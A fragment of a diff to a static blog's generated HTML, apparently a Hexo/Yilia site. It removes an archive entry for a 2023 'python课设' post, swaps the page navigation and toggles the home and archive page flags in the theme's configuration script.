-        <div class="archive-year-wrap">
-          <a href="/archives/2023" class="archive-year">2023</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2023/12/25/python%E8%AF%BE%E8%AE%BE/" class="archive-article-date">
-        <time datetime="2023-12-25T14:49:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-12-25</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2023/12/25/python%E8%AF%BE%E8%AE%BE/" target="_blank">python课设</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
-  
-
-    
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/2/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
     </nav>
   
 
@@ -588,9 +327,9 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: false,
+		isHome: true,
 		isPost: false,
-		isArchive: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
